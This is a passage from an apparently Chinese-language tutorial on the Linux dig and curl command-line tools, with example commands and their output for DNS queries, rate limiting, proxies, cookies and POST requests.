</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">60</span> IN A     109.244.236.65
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">11</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 183.60.83.19#53<span class="o">(</span>183.60.83.19<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Tue Jun <span class="m">22</span> 21:39:33 CST <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">108</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>dig命令输出包括以下部分</strong>：</p>
<ul>
<li><code>HEADER</code>：显示dig命令的版本号、dig命令使用的全局选项，以及一些附加的Header信息。</li>
<li><code>QUESTION SECTION</code>：显示dig像DNSserver发出的请求。即你请求的域名。这里使用dig命令获取<code>qq.com</code>使用的默认类型（A记录）</li>
<li><code>ANSWER SECTION</code>：显示从DNS接收到的应答。将显示<code>qq.com</code> 的A记录</li>
<li><code>ADDITIONAL SECTION</code>：显示<code>ADDITIONAL SECTION</code> 中列出的DNS服务器的ip地址。</li>
<li>底部的Stats部分显示一些dig命令统计信息，包括执行此查询所用的时间</li>
</ul>
<h3 id="仅显示应答部分">仅显示应答部分</h3>
<p>在大多数情况下，我们只需要查看dig的 <code>ANSWER SECTION</code>。可以仅打印该部分。</p>
<ul>
<li><code>+nocomments</code> 不显示注释行</li>
<li><code>+noauthority</code>  不显示<code>authority</code>部分</li>
<li><code>+noadditional</code>   不显示 <code>additional</code> 部分</li>
<li><code>+nostats</code>  不显示统计信息 <code>stats</code></li>
<li><code>+noanswer</code> 关掉<code>ANSWER</code>  部分，这里一般为想要的结果</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig www.qq.com <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +nocomments <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +noquestion <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +noauthority <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +noadditional <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +nostats
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com +nocomments +noquestion +noauthority +noadditional +nostats
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl">www.qq.com.             <span class="m">180</span>     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">31</span> IN A     109.244.236.65
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">31</span> IN A     109.244.236.76
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以使用 <code>+noal</code> 禁用所有不需要的部分，当然也会关掉 <code>answer</code> ，然后<code>+answer</code> 只显示 <code>answer</code>部分，这样看起来简洁些。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig www.qq.com <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +noall <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    +answer
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查询mx记录-1">查询MX记录</h3>
<p>将MX作为参数，可以查询mx记录，可以使用 <code>-t</code> 增加类型</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com  MX +noall +answer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com MX +noall +answer
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4969</span>    IN      MX      <span class="m">10</span> mx3.qq.com.
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4969</span>    IN      MX      <span class="m">20</span> mx2.qq.com.
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4969</span>    IN      MX      <span class="m">30</span> mx1.qq.com.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查询ns记录-1">查询NS记录</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com NS +noall +answer
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查询所有记录">查询所有记录</h3>
<p>查看所有记录类型（A、MX、NS等），可以使用ANY作为类型。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com ANY +noall +answer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com ANY +noall +answer
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">83</span>      IN      A       183.3.226.35
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">83</span>      IN      A       203.205.254.157
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">83</span>      IN      A       123.151.137.18
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">83</span>      IN      A       61.129.7.47
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="仅查看记录的ip">仅查看记录的IP</h3>
<p>有些场景下，仅需要域名的ip地址（即a记录），可以使用 <code> +short</code> 选项。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com +short
</span></span><span class="line"><span class="cl">123.151.137.18
</span></span><span class="line"><span class="cl">203.205.254.157
</span></span><span class="line"><span class="cl">183.3.226.35
</span></span><span class="line"><span class="cl">61.129.7.47
</span></span></code></pre></td></tr></table>
</div>
</div><p><code> +short</code>  也可指定类型</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com a +short
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">111.30.144.71
</span></span><span class="line"><span class="cl">112.53.26.232
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dig qq.com mx +short
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">10</span> mx3.qq.com.
</span></span><span class="line"><span class="cl"><span class="m">20</span> mx2.qq.com.
</span></span><span class="line"><span class="cl"><span class="m">30</span> mx1.qq.com.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="反向查找">反向查找</h3>
<p>可以使用<code>dig-x</code> 进行ip地址反向查找DNS，场景：如果只有一个外部ip地址，并且希望知道属于它的网站时。当然过了CDN的域名，只会显示对应CNAME</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig -x 203.205.254.157 +short 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用指定dns来进行查询">使用指定DNS来进行查询</h3>
<p>默认情况下，dig 使用 <code>/etc/resolv.conf</code> 文件中定义的DNS。如果要使用其他DNS执行查询，使用 <code>@dnsserver</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig @8.8.8.8 www.qq.com +short
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net.
</span></span><span class="line"><span class="cl">109.244.236.76
</span></span><span class="line"><span class="cl">109.244.236.65
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="批量查询">批量查询</h3>
<p>进行批量查询时可以不用通过shell循环查询了，dig提供了批量查询的功能。使用<code>dig -f</code> 从文件内进行批量DNS查询。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> www.qq.com &gt; dns.txt
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> www.baidu.com &gt;&gt; dns.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dig -f dns.txt +noall +answer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www.baidu.com.          <span class="m">678</span>     IN      CNAME   www.a.shifen.com.
</span></span><span class="line"><span class="cl">www.a.shifen.com.       <span class="m">106</span>     IN      A       14.215.177.39
</span></span><span class="line"><span class="cl">www.a.shifen.com.       <span class="m">106</span>     IN      A       14.215.177.38
</span></span><span class="line"><span class="cl">www.qq.com.             <span class="m">60</span>      IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">60</span> IN A     109.244.236.65
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">60</span> IN A     109.244.236.76
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以在命令行直接根多个域名即可，这样查询结果相比于shell循环查询会简洁很多。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig qq.com mx +noall +answer baidu.org ns +noall +answer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com mx +noall +answer baidu.org ns +noall +answer
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4223</span>    IN      MX      <span class="m">10</span> mx3.qq.com.
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4223</span>    IN      MX      <span class="m">20</span> mx2.qq.com.
</span></span><span class="line"><span class="cl">qq.com.                 <span class="m">4223</span>    IN      MX      <span class="m">30</span> mx1.qq.com.
</span></span><span class="line"><span class="cl">baidu.org.              <span class="m">300</span>     IN      NS      ns4.brandshelter.net.
</span></span><span class="line"><span class="cl">baidu.org.              <span class="m">300</span>     IN      NS      ns3.brandshelter.info.
</span></span><span class="line"><span class="cl">baidu.org.              <span class="m">300</span>     IN      NS      ns2.brandshelter.de.
</span></span><span class="line"><span class="cl">baidu.org.              <span class="m">300</span>     IN      NS      ns5.brandshelter.us.
</span></span><span class="line"><span class="cl">baidu.org.              <span class="m">300</span>     IN      NS      ns1.brandshelter.com.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置dig默认选项">设置dig默认选项</h3>
<p>如别名 <code>alias</code> 一样，在查询中不想输入过多的 <code>+noall +answer</code> 之类，可以在 <code>$HOME/.digrc </code> 设置dig 的默认参数，这样只需和平时一样使用 <code>dig domain</code> 即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat <span class="s">&lt;&lt;EOF &gt;${HOME}/.digrc+noall +answerEOF</span>dig www.qq.comwww.qq.com.             <span class="m">247</span>     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">67</span> IN A     109.244.236.76ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">67</span> IN A     109.244.236.6
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="curl">curl</h2>
<p><em><strong>curl</strong></em> 是Linux命令行工具，可以使用任何可支持的协议（如HTTP、FTP、IMAP、POP3、SCP、SFTP、SMTP、TFTP、TELNET、LDAP或FILE）在服务器之间传输数据。</p>
<p>在Linux下，curl是由 <code>libcurl</code> 提供驱动封装的cli客户端，在 <code>libcurl</code> 驱动下，curl可以一次传输多个文件。而PHP中的cURL函数，也是基于libcurl驱动的。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>curl</code>； <code>apt install curl</code></li>
<li>CentOS/Fedora: <code>curl</code>  ； <code>yum install -y curl</code></li>
<li>Apline：<code>curl</code> | <code>wget</code> ； <code>apk add --no-cache curl</code></li>
</ul>
</blockquote>
<h3 id="curl常用参数">cURL常用参数</h3>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-i</td>
<td style="text-align:left">默认隐藏响应头，此选项打印响应头与</td>
</tr>
<tr>
<td style="text-align:center">-I/&ndash;head</td>
<td style="text-align:left">仅显示响应头</td>
</tr>
<tr>
<td style="text-align:center">-o</td>
<td style="text-align:left">将相应内容保存指定路径下</td>
</tr>
<tr>
<td style="text-align:center">-O</td>
<td style="text-align:left">将相应内容保存在当前工作目录下</td>
</tr>
<tr>
<td style="text-align:center">-C</td>
<td style="text-align:left">断点续传，在 crtl + c终端后，可以从中断后部分开始</td>
</tr>
<tr>
<td style="text-align:center">-v</td>
<td style="text-align:left">显示请求头与响应头</td>
</tr>
<tr>
<td style="text-align:center">-x</td>
<td style="text-align:left">使用代理</td>
</tr>
<tr>
<td style="text-align:center">-X</td>
<td style="text-align:left">指定请求方法，POST GET PUT DELETE等</td>
</tr>
<tr>
<td style="text-align:center">-d</td>
<td style="text-align:left">如GET/POST/PUT/DELETE 需要传的表单参数，如JSON格式</td>
</tr>
<tr>
<td style="text-align:center">-u username:password</td>
<td style="text-align:left">当使用ftp有用户名可以使用-u，ftp允许匿名用户访问可以忽略</td>
</tr>
<tr>
<td style="text-align:center">–-limit-rate 2000B</td>
<td style="text-align:left">限速</td>
</tr>
<tr>
<td style="text-align:center">-T/&ndash;upload-file &lt;file&gt;</td>
<td style="text-align:left">上传一个文件</td>
</tr>
<tr>
<td style="text-align:center">-c/&ndash;cookie-jar &lt;file name&gt;</td>
<td style="text-align:left">将cookie下载到文件内</td>
</tr>
<tr>
<td style="text-align:center">-k/&ndash;insecure</td>
<td style="text-align:left">允许执行不安全的ssl连接，即调过SSL检测</td>
</tr>
<tr>
<td style="text-align:center"><code>--header 'Host: targetapplication.com'</code></td>
<td style="text-align:left">使用请求头</td>
</tr>
<tr>
<td style="text-align:center">-L/&ndash;location</td>
<td style="text-align:left">接受服务端redirect的请求</td>
</tr>
<tr>
<td style="text-align:center">-F</td>
<td style="text-align:left">上传二进制文件</td>
</tr>
</tbody>
</table>
<h3 id="限制下载速率">限制下载速率</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --limit-rate 100K http://yourdomain.com/yourfile.tar.gz -O
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用代理访问">使用代理访问</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --proxy yourproxy:port https://yoururl.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="限速访问">限速访问</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl www.baidu.com  --limit-rate 1k
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="存储cookie和使用cookie">存储cookie和使用cookie</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl --cookie-jar cnncookies.txt https://www.baidu.com/index.html -O -s -v
</span></span><span class="line"><span class="cl">* About to connect() to www.baidu.com port 443 (#0)
</span></span><span class="line"><span class="cl">*   Trying 14.215.177.39...
</span></span><span class="line"><span class="cl">* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
</span></span><span class="line"><span class="cl">* Initializing NSS with certpath: sql:/etc/pki/nssdb
</span></span><span class="line"><span class="cl">*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
</span></span><span class="line"><span class="cl">  CApath: none
</span></span><span class="line"><span class="cl">* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span></span><span class="line"><span class="cl">* Server certificate:
</span></span><span class="line"><span class="cl">*       subject: CN=baidu.com,O=&#34;Beijing Baidu Netcom Science Technology Co., Ltd&#34;,OU=service operation department,L=beijing,ST=beijing,C=CN
</span></span><span class="line"><span class="cl">*       start date: Apr 02 07:04:58 2020 GMT
</span></span><span class="line"><span class="cl">*       expire date: Jul 26 05:31:02 2021 GMT
</span></span><span class="line"><span class="cl">*       common name: baidu.com
</span></span><span class="line"><span class="cl">*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
</span></span><span class="line"><span class="cl">&gt; GET /index.html HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.29.0
</span></span><span class="line"><span class="cl">&gt; Host: www.baidu.com
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">&lt; Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
</span></span><span class="line"><span class="cl">&lt; Connection: keep-alive
</span></span><span class="line"><span class="cl">&lt; Content-Length: 2443
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html
</span></span><span class="line"><span class="cl">&lt; Date: Wed, 26 May 2021 12:14:41 GMT
</span></span><span class="line"><span class="cl">&lt; Etag: &#34;58860402-98b&#34;
</span></span><span class="line"><span class="cl">&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
</span></span><span class="line"><span class="cl">&lt; Pragma: no-cache
</span></span><span class="line"><span class="cl">&lt; Server: bfe/1.0.8.18
</span></span><span class="line"><span class="cl">* Added cookie BDORZ=&#34;27315&#34; for domain baidu.com, path /, expire 1622117681
</span></span><span class="line"><span class="cl">&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">{ [data not shown]
</span></span><span class="line"><span class="cl">* Connection #0 to host www.baidu.com left intact
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Netscape HTTP Cookie File# http://curl.haxx.se/docs/http-cookies.html# This file was generated by libcurl! Edit at your own risk..baidu.com      TRUE    /       FALSE   1622117681      BDORZ   27315
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl --cookie cnncookies.txt https://www.baidu.com -s -v -o /dev/null
</span></span><span class="line"><span class="cl">* About to connect() to www.baidu.com port 443 (#0)
</span></span><span class="line"><span class="cl">*   Trying 14.215.177.39...
</span></span><span class="line"><span class="cl">* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
</span></span><span class="line"><span class="cl">* Initializing NSS with certpath: sql:/etc/pki/nssdb
</span></span><span class="line"><span class="cl">*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
</span></span><span class="line"><span class="cl">  CApath: none
</span></span><span class="line"><span class="cl">* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span></span><span class="line"><span class="cl">* Server certificate:
</span></span><span class="line"><span class="cl">*       subject: CN=baidu.com,O=&#34;Beijing Baidu Netcom Science Technology Co., Ltd&#34;,OU=service operation department,L=beijing,ST=beijing,C=CN
</span></span><span class="line"><span class="cl">*       start date: Apr 02 07:04:58 2020 GMT
</span></span><span class="line"><span class="cl">*       expire date: Jul 26 05:31:02 2021 GMT
</span></span><span class="line"><span class="cl">*       common name: baidu.com
</span></span><span class="line"><span class="cl">*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.29.0
</span></span><span class="line"><span class="cl">&gt; Host: www.baidu.com
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; Cookie: BDORZ=27315
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">&lt; Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
</span></span><span class="line"><span class="cl">&lt; Connection: keep-alive
</span></span><span class="line"><span class="cl">&lt; Content-Length: 2443
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html
</span></span><span class="line"><span class="cl">&lt; Date: Wed, 26 May 2021 12:23:27 GMT
</span></span><span class="line"><span class="cl">&lt; Etag: &#34;58860402-98b&#34;
</span></span><span class="line"><span class="cl">&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
</span></span><span class="line"><span class="cl">&lt; Pragma: no-cache
</span></span><span class="line"><span class="cl">&lt; Server: bfe/1.0.8.18
</span></span><span class="line"><span class="cl">* Replaced cookie BDORZ=&#34;27315&#34; for domain baidu.com, path /, expire 1622118207
</span></span><span class="line"><span class="cl">&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/  # 这里可以看到设置的cookie
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">{ [data not shown]
</span></span><span class="line"><span class="cl">* Connection #0 to host www.baidu.com left intact
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用代理">使用代理</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -x socks5://127.0.0.1:10808 https://www.google.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用applicationx-www-form-urlencoded表单类型">使用application/x-www-form-urlencoded表单类型</h3>
<p>这里使用的为<code>application/x-www-form-urlencoded</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -d <span class="s2">&#34;option=value&amp;something=anothervalue&#34;</span> -X POST https://<span class="o">{</span>hostname<span class="o">}</span>/
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用json格式作为body">使用json格式作为body</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> -X POST https://host.com/ <span class="se">\
